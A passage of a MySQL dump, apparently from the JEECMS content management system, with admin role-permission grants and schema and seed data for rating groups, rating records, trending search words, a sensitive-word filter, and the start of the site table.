INSERT INTO `jc_role_permission` (`role_id`,`uri`) VALUES (2,'role:v_edit');
INSERT INTO `jc_role_permission` (`role_id`,`uri`) VALUES (2,'sensitivity:v_list');
INSERT INTO `jc_role_permission` (`role_id`,`uri`) VALUES (2,'item:v_list');
INSERT INTO `jc_role_permission` (`role_id`,`uri`) VALUES (2,'acquisition:v_progress_data');
INSERT INTO `jc_role_permission` (`role_id`,`uri`) VALUES (2,'ftp:v_add');
INSERT INTO `jc_role_permission` (`role_id`,`uri`) VALUES (2,'content_reuse:v_list');
INSERT INTO `jc_role_permission` (`role_id`,`uri`) VALUES (2,'site:v_checkDomain');
INSERT INTO `jc_role_permission` (`role_id`,`uri`) VALUES (2,'admin_global:v_edit');
INSERT INTO `jc_role_permission` (`role_id`,`uri`) VALUES (2,'plug:v_list');
INSERT INTO `jc_role_permission` (`role_id`,`uri`) VALUES (2,'ftp:v_edit');
INSERT INTO `jc_role_permission` (`role_id`,`uri`) VALUES (2,'site:v_add');
INSERT INTO `jc_role_permission` (`role_id`,`uri`) VALUES (2,'config:v_member_edit');
INSERT INTO `jc_role_permission` (`role_id`,`uri`) VALUES (2,'webservice:v_add');
INSERT INTO `jc_role_permission` (`role_id`,`uri`) VALUES (2,'weixinMessage:o_default_save');
INSERT INTO `jc_role_permission` (`role_id`,`uri`) VALUES (2,'data:o_export');
INSERT INTO `jc_role_permission` (`role_id`,`uri`) VALUES (2,'content:v_move');
INSERT INTO `jc_role_permission` (`role_id`,`uri`) VALUES (2,'guestbook:v_edit');
INSERT INTO `jc_role_permission` (`role_id`,`uri`) VALUES (2,'site:v_list');
INSERT INTO `jc_role_permission` (`role_id`,`uri`) VALUES (2,'content:v_tree');
INSERT INTO `jc_role_permission` (`role_id`,`uri`) VALUES (2,'data:v_listfields');
INSERT INTO `jc_role_permission` (`role_id`,`uri`) VALUES (2,'group:v_site_contri_list');
INSERT INTO `jc_role_permission` (`role_id`,`uri`) VALUES (2,'channel:v_tree');
INSERT INTO `jc_role_permission` (`role_id`,`uri`) VALUES (2,'data:v_rename');
INSERT INTO `jc_role_permission` (`role_id`,`uri`) VALUES (2,'friendlink:v_list');
INSERT INTO `jc_role_permission` (`role_id`,`uri`) VALUES (2,'site:v_checkAccessPath');
INSERT INTO `jc_role_permission` (`role_id`,`uri`) VALUES (2,'content_reuse:v_tree');
INSERT INTO `jc_role_permission` (`role_id`,`uri`) VALUES (2,'weixinMenu:v_list');
INSERT INTO `jc_role_permission` (`role_id`,`uri`) VALUES (2,'site_config:v_base_edit');
INSERT INTO `jc_role_permission` (`role_id`,`uri`) VALUES (2,'personal:o_profile');
INSERT INTO `jc_role_permission` (`role_id`,`uri`) VALUES (2,'channel:v_check_path');
INSERT INTO `jc_role_permission` (`role_id`,`uri`) VALUES (2,'dictionary:v_ajax_edit');
INSERT INTO `jc_role_permission` (`role_id`,`uri`) VALUES (2,'directive:v_getcode');
INSERT INTO `jc_role_permission` (`role_id`,`uri`) VALUES (2,'role:v_list');
INSERT INTO `jc_role_permission` (`role_id`,`uri`) VALUES (2,'flow:source:v_list');
INSERT INTO `jc_role_permission` (`role_id`,`uri`) VALUES (2,'admin_global:v_site_add');
INSERT INTO `jc_role_permission` (`role_id`,`uri`) VALUES (2,'flow:pages:v_list');
INSERT INTO `jc_role_permission` (`role_id`,`uri`) VALUES (2,'advertising_space:v_edit');
INSERT INTO `jc_role_permission` (`role_id`,`uri`) VALUES (2,'content:o_static');
INSERT INTO `jc_role_permission` (`role_id`,`uri`) VALUES (2,'webserviceAuth:v_add');
INSERT INTO `jc_role_permission` (`role_id`,`uri`) VALUES (2,'resource:v_tree');
INSERT INTO `jc_role_permission` (`role_id`,`uri`) VALUES (2,'admin_global:v_check_email');
INSERT INTO `jc_role_permission` (`role_id`,`uri`) VALUES (2,'frame:config_main');
INSERT INTO `jc_role_permission` (`role_id`,`uri`) VALUES (2,'index');
INSERT INTO `jc_role_permission` (`role_id`,`uri`) VALUES (2,'special:v_create_dimensioncode');
INSERT INTO `jc_role_permission` (`role_id`,`uri`) VALUES (2,'log:v_list_operating');
INSERT INTO `jc_role_permission` (`role_id`,`uri`) VALUES (2,'template:template_main');
INSERT INTO `jc_role_permission` (`role_id`,`uri`) VALUES (2,'frame:config_right');
INSERT INTO `jc_role_permission` (`role_id`,`uri`) VALUES (2,'origin:v_ajax_edit');
INSERT INTO `jc_role_permission` (`role_id`,`uri`) VALUES (2,'frame:statistic_main');
INSERT INTO `jc_role_permission` (`role_id`,`uri`) VALUES (2,'channel:v_add');
INSERT INTO `jc_role_permission` (`role_id`,`uri`) VALUES (2,'member:v_list');
INSERT INTO `jc_role_permission` (`role_id`,`uri`) VALUES (2,'message:v_countUnreadMsg');
INSERT INTO `jc_role_permission` (`role_id`,`uri`) VALUES (2,'content:o_delete_share');
INSERT INTO `jc_role_permission` (`role_id`,`uri`) VALUES (2,'channel:channel_main');
INSERT INTO `jc_role_permission` (`role_id`,`uri`) VALUES (2,'log:v_list_login_failure');
INSERT INTO `jc_role_permission` (`role_id`,`uri`) VALUES (2,'log:o_delete_login_failure');
INSERT INTO `jc_role_permission` (`role_id`,`uri`) VALUES (2,'content_cycle:o_recycle');
INSERT INTO `jc_role_permission` (`role_id`,`uri`) VALUES (2,'content:o_generateTags');
INSERT INTO `jc_role_permission` (`role_id`,`uri`) VALUES (2,'plug:v_edit');
INSERT INTO `jc_role_permission` (`role_id`,`uri`) VALUES (2,'flow:visitor:v_list');
INSERT INTO `jc_role_permission` (`role_id`,`uri`) VALUES (2,'directive:v_add');
INSERT INTO `jc_role_permission` (`role_id`,`uri`) VALUES (2,'model:v_add');
INSERT INTO `jc_role_permission` (`role_id`,`uri`) VALUES (2,'template:v_tree');
INSERT INTO `jc_role_permission` (`role_id`,`uri`) VALUES (2,'admin_local:v_add');
INSERT INTO `jc_role_permission` (`role_id`,`uri`) VALUES (2,'guestbook:v_add');
INSERT INTO `jc_role_permission` (`role_id`,`uri`) VALUES (2,'directive:v_ajax_edit');
INSERT INTO `jc_role_permission` (`role_id`,`uri`) VALUES (2,'top');
INSERT INTO `jc_role_permission` (`role_id`,`uri`) VALUES (2,'message:v_list');
INSERT INTO `jc_role_permission` (`role_id`,`uri`) VALUES (2,'model:v_list');
INSERT INTO `jc_role_permission` (`role_id`,`uri`) VALUES (2,'webservice:v_edit');
INSERT INTO `jc_role_permission` (`role_id`,`uri`) VALUES (2,'content:v_copy');
INSERT INTO `jc_role_permission` (`role_id`,`uri`) VALUES (2,'scoreitem:v_add');
INSERT INTO `jc_role_permission` (`role_id`,`uri`) VALUES (2,'plug:v_add');
INSERT INTO `jc_role_permission` (`role_id`,`uri`) VALUES (2,'map');
INSERT INTO `jc_role_permission` (`role_id`,`uri`) VALUES (2,'static:v_channel');
INSERT INTO `jc_role_permission` (`role_id`,`uri`) VALUES (2,'vote_topic:v_list');
INSERT INTO `jc_role_permission` (`role_id`,`uri`) VALUES (2,'admin_global:v_channels_add');
INSERT INTO `jc_role_permission` (`role_id`,`uri`) VALUES (2,'comment:v_edit');
INSERT INTO `jc_role_permission` (`role_id`,`uri`) VALUES (2,'config:v_sso_edit');
INSERT INTO `jc_role_permission` (`role_id`,`uri`) VALUES (2,'frame:expand_right');
INSERT INTO `jc_role_permission` (`role_id`,`uri`) VALUES (2,'config:v_system_edit');
INSERT INTO `jc_role_permission` (`role_id`,`uri`) VALUES (2,'site:v_edit');
INSERT INTO `jc_role_permission` (`role_id`,`uri`) VALUES (2,'storeConfig:v_edit');
INSERT INTO `jc_role_permission` (`role_id`,`uri`) VALUES (2,'model:v_check_id');
INSERT INTO `jc_role_permission` (`role_id`,`uri`) VALUES (2,'searchwords:v_ajax_edit');
INSERT INTO `jc_role_permission` (`role_id`,`uri`) VALUES (2,'site:v_left');
INSERT INTO `jc_role_permission` (`role_id`,`uri`) VALUES (2,'tag:v_list');
INSERT INTO `jc_role_permission` (`role_id`,`uri`) VALUES (2,'jobapply:v_view');
INSERT INTO `jc_role_permission` (`role_id`,`uri`) VALUES (2,'data:v_selectfile');
INSERT INTO `jc_role_permission` (`role_id`,`uri`) VALUES (2,'department:v_tree');
INSERT INTO `jc_role_permission` (`role_id`,`uri`) VALUES (2,'content:v_pigeonhole');
INSERT INTO `jc_role_permission` (`role_id`,`uri`) VALUES (2,'group:v_edit');
INSERT INTO `jc_role_permission` (`role_id`,`uri`) VALUES (2,'scoregroup:v_add');
INSERT INTO `jc_role_permission` (`role_id`,`uri`) VALUES (2,'admin_local:v_depart_add');
INSERT INTO `jc_role_permission` (`role_id`,`uri`) VALUES (2,'static:o_reset_generate');
INSERT INTO `jc_role_permission` (`role_id`,`uri`) VALUES (2,'static:v_reset_generate');
INSERT INTO `jc_role_permission` (`role_id`,`uri`) VALUES (2,'config:v_login_edit');
INSERT INTO `jc_role_permission` (`role_id`,`uri`) VALUES (2,'frame:config_left');
INSERT INTO `jc_role_permission` (`role_id`,`uri`) VALUES (2,'department:v_check_name');
INSERT INTO `jc_role_permission` (`role_id`,`uri`) VALUES (2,'weixinMessage:v_default_set');
INSERT INTO `jc_role_permission` (`role_id`,`uri`) VALUES (2,'jobapply:v_list');
INSERT INTO `jc_role_permission` (`role_id`,`uri`) VALUES (2,'type:v_edit');
INSERT INTO `jc_role_permission` (`role_id`,`uri`) VALUES (2,'static:v_index');
INSERT INTO `jc_role_permission` (`role_id`,`uri`) VALUES (2,'member:v_edit');
INSERT INTO `jc_role_permission` (`role_id`,`uri`) VALUES (2,'content_reuse:v_left');
INSERT INTO `jc_role_permission` (`role_id`,`uri`) VALUES (2,'type:v_add');
INSERT INTO `jc_role_permission` (`role_id`,`uri`) VALUES (2,'main');
INSERT INTO `jc_role_permission` (`role_id`,`uri`) VALUES (2,'content:v_push');
INSERT INTO `jc_role_permission` (`role_id`,`uri`) VALUES (2,'statistic:content:v_list');
INSERT INTO `jc_role_permission` (`role_id`,`uri`) VALUES (2,'directive:v_edit');
INSERT INTO `jc_role_permission` (`role_id`,`uri`) VALUES (2,'static:o_index_remove');
INSERT INTO `jc_role_permission` (`role_id`,`uri`) VALUES (2,'topic:v_list');
INSERT INTO `jc_role_permission` (`role_id`,`uri`) VALUES (2,'log:o_delete_login_success_batch');
INSERT INTO `jc_role_permission` (`role_id`,`uri`) VALUES (2,'content:v_submit');
INSERT INTO `jc_role_permission` (`role_id`,`uri`) VALUES (2,'channel:v_left');
INSERT INTO `jc_role_permission` (`role_id`,`uri`) VALUES (2,'frame:maintain_right');
INSERT INTO `jc_role_permission` (`role_id`,`uri`) VALUES (2,'admin_global:v_list');
INSERT INTO `jc_role_permission` (`role_id`,`uri`) VALUES (2,'item:v_edit');
INSERT INTO `jc_role_permission` (`role_id`,`uri`) VALUES (2,'channel:v_edit');
INSERT INTO `jc_role_permission` (`role_id`,`uri`) VALUES (2,'contentBuy:user_account_list');
INSERT INTO `jc_role_permission` (`role_id`,`uri`) VALUES (2,'accountPay:payByWeiXin');
INSERT INTO `jc_role_permission` (`role_id`,`uri`) VALUES (2,'frame:expand_main');
INSERT INTO `jc_role_permission` (`role_id`,`uri`) VALUES (2,'log:o_delete_login_failure_batch');
INSERT INTO `jc_role_permission` (`role_id`,`uri`) VALUES (2,'webserviceAuth:v_list');
INSERT INTO `jc_role_permission` (`role_id`,`uri`) VALUES (2,'dictionary:v_edit');
INSERT INTO `jc_role_permission` (`role_id`,`uri`) VALUES (2,'dictionary:v_check_value');
INSERT INTO `jc_role_permission` (`role_id`,`uri`) VALUES (2,'group:v_site_list');
INSERT INTO `jc_role_permission` (`role_id`,`uri`) VALUES (2,'admin_global:v_channels_edit');
INSERT INTO `jc_role_permission` (`role_id`,`uri`) VALUES (2,'tag:v_edit');
INSERT INTO `jc_role_permission` (`role_id`,`uri`) VALUES (2,'searchwords:v_list');
INSERT INTO `jc_role_permission` (`role_id`,`uri`) VALUES (2,'acquisition:v_edit');
INSERT INTO `jc_role_permission` (`role_id`,`uri`) VALUES (2,'content:rank_list');
INSERT INTO `jc_role_permission` (`role_id`,`uri`) VALUES (2,'weixin:v_edit');
INSERT INTO `jc_role_permission` (`role_id`,`uri`) VALUES (2,'advertising_space:v_list');
INSERT INTO `jc_role_permission` (`role_id`,`uri`) VALUES (2,'config:v_firewall');
INSERT INTO `jc_role_permission` (`role_id`,`uri`) VALUES (2,'friendlink:v_edit');
INSERT INTO `jc_role_permission` (`role_id`,`uri`) VALUES (2,'content_cycle:o_delete');
INSERT INTO `jc_role_permission` (`role_id`,`uri`) VALUES (2,'static:v_content');
INSERT INTO `jc_role_permission` (`role_id`,`uri`) VALUES (2,'content:v_check_records');
INSERT INTO `jc_role_permission` (`role_id`,`uri`) VALUES (2,'frame:user_left');
INSERT INTO `jc_role_permission` (`role_id`,`uri`) VALUES (2,'flow:enterpage:v_list');
INSERT INTO `jc_role_permission` (`role_id`,`uri`) VALUES (2,'template:v_setting');
INSERT INTO `jc_role_permission` (`role_id`,`uri`) VALUES (2,'department:v_add');
INSERT INTO `jc_role_permission` (`role_id`,`uri`) VALUES (2,'content:v_view_share');
INSERT INTO `jc_role_permission` (`role_id`,`uri`) VALUES (2,'acquisition:v_add');
INSERT INTO `jc_role_permission` (`role_id`,`uri`) VALUES (2,'personal:v_profile');
INSERT INTO `jc_role_permission` (`role_id`,`uri`) VALUES (2,'special:o_create_dimensioncode');
INSERT INTO `jc_role_permission` (`role_id`,`uri`) VALUES (2,'message:v_edit');
INSERT INTO `jc_role_permission` (`role_id`,`uri`) VALUES (2,'type:v_check_id');
INSERT INTO `jc_role_permission` (`role_id`,`uri`) VALUES (2,'content_reuse:v_main');
INSERT INTO `jc_role_permission` (`role_id`,`uri`) VALUES (2,'log:o_delete_operating');
INSERT INTO `jc_role_permission` (`role_id`,`uri`) VALUES (2,'topic:by_channel');
INSERT INTO `jc_role_permission` (`role_id`,`uri`) VALUES (2,'accountPay:goToPay');
INSERT INTO `jc_role_permission` (`role_id`,`uri`) VALUES (2,'data:v_listfiles');
INSERT INTO `jc_role_permission` (`role_id`,`uri`) VALUES (2,'lucene:v_index');
INSERT INTO `jc_role_permission` (`role_id`,`uri`) VALUES (2,'department:v_channels_list');
INSERT INTO `jc_role_permission` (`role_id`,`uri`) VALUES (2,'frame:statistic_right');
INSERT INTO `jc_role_permission` (`role_id`,`uri`) VALUES (2,'scoreitem:v_list');
INSERT INTO `jc_role_permission` (`role_id`,`uri`) VALUES (2,'accountPay:payLogin');
INSERT INTO `jc_role_permission` (`role_id`,`uri`) VALUES (2,'content:v_priority');
INSERT INTO `jc_role_permission` (`role_id`,`uri`) VALUES (2,'vote_topic:v_edit');
INSERT INTO `jc_role_permission` (`role_id`,`uri`) VALUES (2,'acquisition:v_progress');
INSERT INTO `jc_role_permission` (`role_id`,`uri`) VALUES (2,'content:v_origin_list');
INSERT INTO `jc_role_permission` (`role_id`,`uri`) VALUES (2,'friendlink_ctg:v_list');
INSERT INTO `jc_role_permission` (`role_id`,`uri`) VALUES (2,'weixinMenu:v_add');
INSERT INTO `jc_role_permission` (`role_id`,`uri`) VALUES (2,'data:v_list');
INSERT INTO `jc_role_permission` (`role_id`,`uri`) VALUES (2,'member:v_check_username');
INSERT INTO `jc_role_permission` (`role_id`,`uri`) VALUES (2,'resource:v_add');
INSERT INTO `jc_role_permission` (`role_id`,`uri`) VALUES (2,'statistic:member:v_list');
INSERT INTO `jc_role_permission` (`role_id`,`uri`) VALUES (2,'contentBuy:charge_list');
INSERT INTO `jc_role_permission` (`role_id`,`uri`) VALUES (2,'frame:expand_left');
INSERT INTO `jc_role_permission` (`role_id`,`uri`) VALUES (2,'site:v_tree');
INSERT INTO `jc_role_permission` (`role_id`,`uri`) VALUES (2,'task:v_edit');

#
# Source for table jc_score_group
#

CREATE TABLE `jc_score_group` (
  `score_group_id` int(11) NOT NULL AUTO_INCREMENT,
  `name` varchar(255) NOT NULL COMMENT '分组名',
  `description` varchar(1000) DEFAULT NULL COMMENT '描述',
  `enable` tinyint(1) NOT NULL DEFAULT '0' COMMENT '是否启用',
  `def` tinyint(3) NOT NULL DEFAULT '0' COMMENT '是否默认',
  `site_id` int(11) NOT NULL COMMENT '站点',
  PRIMARY KEY (`score_group_id`),
  KEY `fk_jc_score_group_site` (`site_id`)
) ENGINE=InnoDB AUTO_INCREMENT=3 DEFAULT CHARSET=utf8 COMMENT='FComment';

#
# Dumping data for table jc_score_group
#

INSERT INTO `jc_score_group` (`score_group_id`,`name`,`description`,`enable`,`def`,`site_id`) VALUES (1,'心情组','心情组',0,1,1);
INSERT INTO `jc_score_group` (`score_group_id`,`name`,`description`,`enable`,`def`,`site_id`) VALUES (2,'星级评分','星级评分',1,0,1);

#
# Source for table jc_score_item
#

CREATE TABLE `jc_score_item` (
  `score_item_id` int(11) NOT NULL AUTO_INCREMENT,
  `score_group_id` int(11) NOT NULL COMMENT '评分组',
  `name` varchar(255) NOT NULL COMMENT '评分名',
  `score` int(11) NOT NULL COMMENT '分值',
  `image_path` varchar(255) DEFAULT NULL COMMENT '评分图标路径',
  `priority` int(11) NOT NULL DEFAULT '10' COMMENT '排序',
  PRIMARY KEY (`score_item_id`),
  KEY `fk_jc_score_item_group` (`score_group_id`)
) ENGINE=InnoDB AUTO_INCREMENT=14 DEFAULT CHARSET=utf8 COMMENT='评分项';

#
# Dumping data for table jc_score_item
#

INSERT INTO `jc_score_item` (`score_item_id`,`score_group_id`,`name`,`score`,`image_path`,`priority`) VALUES (1,1,'开心',1,'/r/cms/smilies/m1.gif',1);
INSERT INTO `jc_score_item` (`score_item_id`,`score_group_id`,`name`,`score`,`image_path`,`priority`) VALUES (2,1,'板砖',1,'/r/cms/smilies/m2.gif',2);
INSERT INTO `jc_score_item` (`score_item_id`,`score_group_id`,`name`,`score`,`image_path`,`priority`) VALUES (3,1,'感动',1,'/r/cms/smilies/m3.gif',3);
INSERT INTO `jc_score_item` (`score_item_id`,`score_group_id`,`name`,`score`,`image_path`,`priority`) VALUES (4,1,'有用',1,'/r/cms/smilies/m4.gif',4);
INSERT INTO `jc_score_item` (`score_item_id`,`score_group_id`,`name`,`score`,`image_path`,`priority`) VALUES (5,1,'疑问',1,'/r/cms/smilies/m5.gif',5);
INSERT INTO `jc_score_item` (`score_item_id`,`score_group_id`,`name`,`score`,`image_path`,`priority`) VALUES (6,1,'难过',1,'/r/cms/smilies/m6.gif',6);
INSERT INTO `jc_score_item` (`score_item_id`,`score_group_id`,`name`,`score`,`image_path`,`priority`) VALUES (7,1,'无聊',1,'/r/cms/smilies/m7.gif',7);
INSERT INTO `jc_score_item` (`score_item_id`,`score_group_id`,`name`,`score`,`image_path`,`priority`) VALUES (8,1,'震惊',1,'/r/cms/smilies/m8.gif',8);
INSERT INTO `jc_score_item` (`score_item_id`,`score_group_id`,`name`,`score`,`image_path`,`priority`) VALUES (9,2,'非常差',1,'',1);
INSERT INTO `jc_score_item` (`score_item_id`,`score_group_id`,`name`,`score`,`image_path`,`priority`) VALUES (10,2,'差',2,'',2);
INSERT INTO `jc_score_item` (`score_item_id`,`score_group_id`,`name`,`score`,`image_path`,`priority`) VALUES (11,2,'一般',3,'',3);
INSERT INTO `jc_score_item` (`score_item_id`,`score_group_id`,`name`,`score`,`image_path`,`priority`) VALUES (12,2,'好',4,'',4);
INSERT INTO `jc_score_item` (`score_item_id`,`score_group_id`,`name`,`score`,`image_path`,`priority`) VALUES (13,2,'非常好',5,'',5);

#
# Source for table jc_score_record
#

CREATE TABLE `jc_score_record` (
  `score_record_id` int(11) NOT NULL AUTO_INCREMENT,
  `score_item_id` int(11) NOT NULL COMMENT '评分项',
  `content_id` int(11) NOT NULL COMMENT '内容',
  `score_count` int(11) NOT NULL COMMENT '评分次数',
  PRIMARY KEY (`score_record_id`),
  KEY `fk_jc_record_score_item` (`score_item_id`),
  KEY `index_score_record_content` (`content_id`)
) ENGINE=InnoDB AUTO_INCREMENT=24 DEFAULT CHARSET=utf8 COMMENT='评分纪录';

#
# Dumping data for table jc_score_record
#

INSERT INTO `jc_score_record` (`score_record_id`,`score_item_id`,`content_id`,`score_count`) VALUES (3,1,33,17);
INSERT INTO `jc_score_record` (`score_record_id`,`score_item_id`,`content_id`,`score_count`) VALUES (4,5,33,1);
INSERT INTO `jc_score_record` (`score_record_id`,`score_item_id`,`content_id`,`score_count`) VALUES (6,1,32,2);
INSERT INTO `jc_score_record` (`score_record_id`,`score_item_id`,`content_id`,`score_count`) VALUES (7,8,12,1);
INSERT INTO `jc_score_record` (`score_record_id`,`score_item_id`,`content_id`,`score_count`) VALUES (10,1,132,1);
INSERT INTO `jc_score_record` (`score_record_id`,`score_item_id`,`content_id`,`score_count`) VALUES (11,1,113,11);
INSERT INTO `jc_score_record` (`score_record_id`,`score_item_id`,`content_id`,`score_count`) VALUES (12,1,27,2);
INSERT INTO `jc_score_record` (`score_record_id`,`score_item_id`,`content_id`,`score_count`) VALUES (13,1,39,18);
INSERT INTO `jc_score_record` (`score_record_id`,`score_item_id`,`content_id`,`score_count`) VALUES (14,1,131,13);
INSERT INTO `jc_score_record` (`score_record_id`,`score_item_id`,`content_id`,`score_count`) VALUES (15,1,30,41);
INSERT INTO `jc_score_record` (`score_record_id`,`score_item_id`,`content_id`,`score_count`) VALUES (16,1,14,13);
INSERT INTO `jc_score_record` (`score_record_id`,`score_item_id`,`content_id`,`score_count`) VALUES (17,1,130,12);
INSERT INTO `jc_score_record` (`score_record_id`,`score_item_id`,`content_id`,`score_count`) VALUES (18,1,112,18);
INSERT INTO `jc_score_record` (`score_record_id`,`score_item_id`,`content_id`,`score_count`) VALUES (19,1,111,12);
INSERT INTO `jc_score_record` (`score_record_id`,`score_item_id`,`content_id`,`score_count`) VALUES (20,1,29,1);
INSERT INTO `jc_score_record` (`score_record_id`,`score_item_id`,`content_id`,`score_count`) VALUES (21,1,28,1);
INSERT INTO `jc_score_record` (`score_record_id`,`score_item_id`,`content_id`,`score_count`) VALUES (22,1,23,11);
INSERT INTO `jc_score_record` (`score_record_id`,`score_item_id`,`content_id`,`score_count`) VALUES (23,5,28,1);

#
# Source for table jc_search_words
#

CREATE TABLE `jc_search_words` (
  `word_id` int(11) NOT NULL AUTO_INCREMENT,
  `name` varchar(255) NOT NULL COMMENT '搜索词汇',
  `hit_count` int(11) NOT NULL DEFAULT '0' COMMENT '搜索次数',
  `priority` int(11) NOT NULL DEFAULT '10' COMMENT '优先级',
  `name_initial` varchar(500) NOT NULL DEFAULT '' COMMENT '拼音首字母',
  `is_recommend` tinyint(1) NOT NULL DEFAULT '0' COMMENT '推荐',
  `site_id` int(11) NOT NULL DEFAULT '1' COMMENT '站点',
  PRIMARY KEY (`word_id`)
) ENGINE=InnoDB AUTO_INCREMENT=42 DEFAULT CHARSET=utf8 COMMENT='搜索热词';

#
# Dumping data for table jc_search_words
#

INSERT INTO `jc_search_words` (`word_id`,`name`,`hit_count`,`priority`,`name_initial`,`is_recommend`,`site_id`) VALUES (1,'台湾地震',6,10,'twdz',1,1);
INSERT INTO `jc_search_words` (`word_id`,`name`,`hit_count`,`priority`,`name_initial`,`is_recommend`,`site_id`) VALUES (5,'楼市',64,2,'ls',1,1);
INSERT INTO `jc_search_words` (`word_id`,`name`,`hit_count`,`priority`,`name_initial`,`is_recommend`,`site_id`) VALUES (6,'四川',2,11,'sc',1,1);
INSERT INTO `jc_search_words` (`word_id`,`name`,`hit_count`,`priority`,`name_initial`,`is_recommend`,`site_id`) VALUES (7,'黄金接连下跌',13,10,'hjjlxd',1,1);
INSERT INTO `jc_search_words` (`word_id`,`name`,`hit_count`,`priority`,`name_initial`,`is_recommend`,`site_id`) VALUES (8,'里约奥运会',2,12,'lyayh',1,1);
INSERT INTO `jc_search_words` (`word_id`,`name`,`hit_count`,`priority`,`name_initial`,`is_recommend`,`site_id`) VALUES (9,'电信诈骗',23,10,'dxzp',1,1);
INSERT INTO `jc_search_words` (`word_id`,`name`,`hit_count`,`priority`,`name_initial`,`is_recommend`,`site_id`) VALUES (10,'雷洋案',12,11,'lya',1,1);
INSERT INTO `jc_search_words` (`word_id`,`name`,`hit_count`,`priority`,`name_initial`,`is_recommend`,`site_id`) VALUES (13,'2015各行业平均工资',9,10,'2015gxypjgz',1,1);
INSERT INTO `jc_search_words` (`word_id`,`name`,`hit_count`,`priority`,`name_initial`,`is_recommend`,`site_id`) VALUES (14,'太阳的后裔',10,10,'tydhy',1,1);
INSERT INTO `jc_search_words` (`word_id`,`name`,`hit_count`,`priority`,`name_initial`,`is_recommend`,`site_id`) VALUES (15,'广西 ',1,10,'gx',0,1);
INSERT INTO `jc_search_words` (`word_id`,`name`,`hit_count`,`priority`,`name_initial`,`is_recommend`,`site_id`) VALUES (17,'莆田系',17,10,'ptx',1,1);
INSERT INTO `jc_search_words` (`word_id`,`name`,`hit_count`,`priority`,`name_initial`,`is_recommend`,`site_id`) VALUES (18,'巴基斯坦',1,10,'bjst',0,1);
INSERT INTO `jc_search_words` (`word_id`,`name`,`hit_count`,`priority`,`name_initial`,`is_recommend`,`site_id`) VALUES (21,'北京',1,10,'bj',0,1);
INSERT INTO `jc_search_words` (`word_id`,`name`,`hit_count`,`priority`,`name_initial`,`is_recommend`,`site_id`) VALUES (29,'中级java工程师',1,10,'zjjavagcs',0,1);
INSERT INTO `jc_search_words` (`word_id`,`name`,`hit_count`,`priority`,`name_initial`,`is_recommend`,`site_id`) VALUES (30,'高考',1,10,'gk',0,1);
INSERT INTO `jc_search_words` (`word_id`,`name`,`hit_count`,`priority`,`name_initial`,`is_recommend`,`site_id`) VALUES (31,'请输入关键词',2,10,'qsrgjc',0,1);
INSERT INTO `jc_search_words` (`word_id`,`name`,`hit_count`,`priority`,`name_initial`,`is_recommend`,`site_id`) VALUES (32,'全文检索测试',1,10,'qwjscs',0,1);
INSERT INTO `jc_search_words` (`word_id`,`name`,`hit_count`,`priority`,`name_initial`,`is_recommend`,`site_id`) VALUES (33,'草原天路收费',3,11,'cytlsf',1,1);
INSERT INTO `jc_search_words` (`word_id`,`name`,`hit_count`,`priority`,`name_initial`,`is_recommend`,`site_id`) VALUES (34,'世界',1,10,'sj',0,1);
INSERT INTO `jc_search_words` (`word_id`,`name`,`hit_count`,`priority`,`name_initial`,`is_recommend`,`site_id`) VALUES (35,'jeecms',1,10,'jeecms',0,1);
INSERT INTO `jc_search_words` (`word_id`,`name`,`hit_count`,`priority`,`name_initial`,`is_recommend`,`site_id`) VALUES (37,'涓浗寤鸿',1,10,'涓??寤h?',0,1);
INSERT INTO `jc_search_words` (`word_id`,`name`,`hit_count`,`priority`,`name_initial`,`is_recommend`,`site_id`) VALUES (38,'高考减招',22,10,'gkjz',1,1);
INSERT INTO `jc_search_words` (`word_id`,`name`,`hit_count`,`priority`,`name_initial`,`is_recommend`,`site_id`) VALUES (39,'1234＃/',1,10,'1234＃/',0,1);
INSERT INTO `jc_search_words` (`word_id`,`name`,`hit_count`,`priority`,`name_initial`,`is_recommend`,`site_id`) VALUES (40,'李克强',2,10,'lkq',0,1);
INSERT INTO `jc_search_words` (`word_id`,`name`,`hit_count`,`priority`,`name_initial`,`is_recommend`,`site_id`) VALUES (41,'年',1,10,'n',0,1);

#
# Source for table jc_sensitivity
#

CREATE TABLE `jc_sensitivity` (
  `sensitivity_id` int(11) NOT NULL AUTO_INCREMENT,
  `search` varchar(255) NOT NULL COMMENT '敏感词',
  `replacement` varchar(255) NOT NULL COMMENT '替换词',
  PRIMARY KEY (`sensitivity_id`)
) ENGINE=InnoDB AUTO_INCREMENT=2 DEFAULT CHARSET=utf8 COMMENT='CMS敏感词表';

#
# Dumping data for table jc_sensitivity
#

INSERT INTO `jc_sensitivity` (`sensitivity_id`,`search`,`replacement`) VALUES (1,'法论功','***');

#
# Source for table jc_site
#

CREATE TABLE `jc_site` (
  `site_id` int(11) NOT NULL AUTO_INCREMENT,
  `config_id` int(11) NOT NULL COMMENT '配置ID',
  `ftp_upload_id` int(11) DEFAULT NULL COMMENT '上传ftp',
  `domain` varchar(50) NOT NULL COMMENT '域名',
  `site_path` varchar(20) NOT NULL COMMENT '路径',
  `site_name` varchar(100) NOT NULL COMMENT '网站名称',
  `short_name` varchar(100) NOT NULL COMMENT '简短名称',
  `protocol` varchar(20) NOT NULL DEFAULT 'http://' COMMENT '协议',
  `dynamic_suffix` varchar(10) NOT NULL DEFAULT '.jhtml' COMMENT '动态页后缀',
  `static_suffix` varchar(10) NOT NULL DEFAULT '.html' COMMENT '静态页后缀',
  `static_dir` varchar(50) DEFAULT NULL COMMENT '静态页存放目录',
  `is_index_to_root` char(1) NOT NULL DEFAULT '0' COMMENT '是否使用将首页放在根目录下',
  `is_static_index` char(1) NOT NULL DEFAULT '0' COMMENT '是否静态化首页',
  `locale_admin` varchar(10) NOT NULL DEFAULT 'zh_CN' COMMENT '后台本地化',
  `locale_front` varchar(10) NOT NULL DEFAULT 'zh_CN' COMMENT '前台本地化',
  `tpl_solution` varchar(50) NOT NULL DEFAULT 'default' COMMENT '模板方案',
  `final_step` tinyint(4) NOT NULL DEFAULT '2' COMMENT '终审级别',
  `after_check` tinyint(4) NOT NULL DEFAULT '2' COMMENT '审核后(1:不能修改删除;2:修改后退回;3:修改后不变)',
  `is_relative_path` char(1) NOT NULL DEFAULT '1' COMMENT '是否使用相对路径',
  `is_recycle_on` char(1) NOT NULL DEFAULT '1' COMMENT '是否开启回收站',
  `domain_alias` varchar(255) DEFAULT NULL COMMENT '域名别名',
  `domain_redirect` varchar(255) DEFAULT NULL COMMENT '域名重定向',
  `tpl_index` varchar(255) DEFAULT NULL COMMENT '首页模板',
  `keywords` varchar(255) DEFAULT NULL COMMENT '站点关键字',
  `description` varchar(255) DEFAULT NULL COMMENT '站点描述',
